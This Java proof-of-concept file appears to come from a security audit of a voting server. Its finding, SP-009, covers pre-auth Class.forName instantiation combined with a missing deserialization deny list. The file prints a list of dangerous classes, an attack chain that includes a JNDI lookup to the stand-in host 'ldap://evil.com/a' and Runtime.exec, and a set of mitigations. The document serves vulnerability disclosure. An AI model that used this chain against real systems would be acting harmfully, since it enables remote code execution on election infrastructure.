/*
 * PoC: SP-009 — Pre-Auth Class.forName Instantiation via Deserialization
 *
 * The voting server uses Class.forName() to instantiate objects from
 * class names provided in serialized data. When this occurs on
 * unauthenticated endpoints, an attacker can trigger arbitrary class
 * loading and instantiation.
 *
 * The risk depends on what classes are on the classpath:
 * - JNDI lookup classes → SSRF/RCE
 * - File I/O classes → file read/write
 * - Network classes → SSRF
 * - Database classes → connection manipulation
 *
 * Combined with SP-001 (no deserializationDenyList on ANY component),
 * this creates a pre-auth remote code execution chain.
 *
 * Source: Various deserialization handlers in voting-server
 */
public class SP009_ClassForNamePreAuth {
    public static void main(String[] args) {
        System.out.println("=".repeat(60));
        System.out.println("SP-009: Pre-Auth Class.forName Instantiation PoC");
        System.out.println("=".repeat(60));
        System.out.println();
        System.out.println("Vulnerable pattern:");
        System.out.println("  Class<?> clazz = Class.forName(untrustedClassName);");
        System.out.println("  Object obj = clazz.getDeclaredConstructor().newInstance();");
        System.out.println();
        System.out.println("Combined with SP-001 (no deserializationDenyList):");
        System.out.println("  - Voting server: NO deny list configured");
        System.out.println("  - Control components: NO deny list configured");
        System.out.println("  - Neither component restricts deserializable classes");
        System.out.println();

        // Demonstrate dangerous classes available on typical Spring Boot classpath
        String[] dangerousClasses = {
            "javax.naming.InitialContext",
            "java.lang.Runtime",
            "java.lang.ProcessBuilder",
            "java.io.FileInputStream",
            "java.io.FileOutputStream",
            "java.net.URLClassLoader",
            "org.springframework.context.support.ClassPathXmlApplicationContext",
        };

        System.out.println("Dangerous classes typically on Spring Boot classpath:");
        System.out.println();
        for (String className : dangerousClasses) {
            try {
                Class<?> clazz = Class.forName(className);
                System.out.printf("  [AVAILABLE] %s%n", className);
            } catch (ClassNotFoundException e) {
                System.out.printf("  [NOT FOUND] %s%n", className);
            }
        }

        System.out.println();
        System.out.println("Attack chain:");
        System.out.println("  1. Send crafted payload to pre-auth endpoint");
        System.out.println("  2. Payload contains malicious class name");
        System.out.println("  3. Class.forName() loads attacker-specified class");
        System.out.println("  4. No deny list blocks dangerous classes (SP-001)");
        System.out.println("  5. Class instantiation triggers side effects:");
        System.out.println("     - JNDI: InitialContext.lookup(\"ldap://evil.com/a\")");
        System.out.println("     - RCE:  Runtime.exec(\"cmd\")");
        System.out.println("     - SSRF: URLClassLoader with remote URL");
        System.out.println();
        System.out.println("Mitigation required:");
        System.out.println("  1. Configure deserializationDenyList on ALL components");
        System.out.println("  2. Use allowlist-based class filtering");
        System.out.println("  3. Remove Class.forName on untrusted input");
        System.out.println("  4. Add ObjectInputFilter (JEP 290) globally");
    }
}
